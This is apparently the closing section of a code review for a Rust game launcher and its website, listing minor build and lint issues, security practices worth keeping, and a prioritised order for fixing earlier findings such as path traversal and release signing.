- **No toolchain pin.** The code uses edition 2024 and let-chains, so it needs a recent stable. A `rust-toolchain.toml` (and `rust-version` in the manifests) keeps the Docker, CI and local builds the same.
- **Clippy warnings (3):**
  - `redundant_closure` at [boot.rs:48](crates/gui/src/app/boot.rs:48): use `LodestoneAppMessage::DatabaseReady` directly.
  - Dead `Launcher::display_names` at [import/launcher/mod.rs:105](crates/gui/src/app/import/launcher/mod.rs:105).
  - `field_reassign_with_default` in `tests/app/pages/worlds/list.rs:17`.
- **Future-incompatibility warning:** `block v0.1.6` comes in through `metal`, then `wgpu-hal`, then iced 0.14. That's upstream; track it when you move to the next iced/wgpu.
- **AGENTS.md says builds run in Docker,** but the `justfile` recipes call `cargo` directly. Either the doc or the recipes should change so they agree.

---

## Things done well (worth keeping)

- Blocking IO is kept off the UI thread consistently (`spawn_blocking` everywhere it matters), and the writers that serialise their own writes (`CredentialWriter`, `KeyedWriter`) are a good pattern; extend them to preferences (#3).
- Pid-file liveness checks the process start time, so a reused pid is never treated as the game.
- Archive extraction (`extract`, `extract_overrides`, world zips) rejects paths that leave the target folder. Only the download path list (#1) was missed.
- The updater's `.part`-then-rename, the Windows elevation flow and the macOS bundle swap with rollback are solid. Only the trust root needs work (#7).
- The server-ping parser bounds packet sizes (`MAX_PACKET`) and puts a timeout on the whole exchange.
- Website: prepared statements throughout, strict JWT checks (pinned algorithm, issuer, type and subject format), `__Host-` cookies with `HttpOnly`, `Secure` and `SameSite=Strict`, verified Stripe signatures, a hex check on blob hashes, and bounded body sizes.
- The tests are broad (over 1,200 passing), and the mirrored test tree with the 750-line limit keeps modules readable.

---

## Suggested order of work

1. **#1** (path traversal and the URL allowlist): small, self-contained, and the most serious.
2. **#2** (fix `simple_download_utility`: status check, `.part`, rename), then publish 0.1.2 and bump it here.
3. **#3 and #6, plus #25:** one shared `write_atomic` and one serial preferences writer.
4. **#4** (URL scheme allowlist in `open_source`): one function.
5. **#5 and #15** (key accounts by UUID), with a migration.
6. **#8, #9, #10:** UI-thread load and network hygiene.
7. **#7:** sign the release checksums, then verify code signatures per OS.
8. Add the CI workflow so later regressions are caught.
